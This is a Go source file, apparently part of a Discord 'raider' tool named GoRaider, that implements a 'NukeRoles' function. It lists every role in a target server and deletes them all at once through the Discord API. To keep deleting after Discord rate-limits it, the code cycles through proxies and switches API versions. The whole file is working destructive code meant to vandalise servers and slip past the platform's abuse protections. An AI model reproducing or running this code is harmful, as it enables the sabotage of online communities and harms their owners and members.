package api

import (
	"fmt"
	"sync"

	"github.com/Not-Cyrus/GoRaider/utils"
	"github.com/valyala/fastjson"
)

func deleteRole(roleID string, wg *sync.WaitGroup) {
	defer wg.Done()
	
	if len(proxies) <= roleProxy {
		roleProxy = 1
	}
		
	res, stat := utils.SendRequest("DELETE", fmt.Sprintf("https://discord.com/api/v%d/guilds/%s/roles/%s", roleAPI, utils.GuildID, roleID), "application/json", proxies[roleProxy], nil)

	switch {
	case stat == 0:
		roleProxy++ // our proxy didn't like us... sad.
	case stat == 204:
		rolesDeleted++
	case stat == 429:
		err := fastjson.Validate(res)
		if err != nil {
			return 
		}
		parsed, _ := parser.Parse(res)

		switch {
		
		case roleAPI == 8:
			roleAPI = 6

		case roleAPI > 8:
			roleAPI++ // change our api version (until we get limited)

		case len(proxies) <= proxyCount:
			proxyCount = 0

		case parsed.GetBool("global") && len(proxies) <= roleProxy:
			roleProxy++ // we got a global rate limit so we should probably switch proxies
		}
		wg.Add(1)
		deleteRole(roleID, wg)
	}
}

func deleteRoles(array []string) {
	wg := new(sync.WaitGroup)
	for _, role := range array {
		if len(role) != 0 {
			wg.Add(1)
			go deleteRole(role, wg)
		}
	}
	wg.Wait()
}

func NukeRoles() {
	_, array := utils.GetData("https://discord.com/api/v8/guilds/%s/roles", "id")
	deleteRoles(array)
}

var (
	roleAPI      int = 6
	rolesDeleted int = 0
	roleProxy    int = 1
)
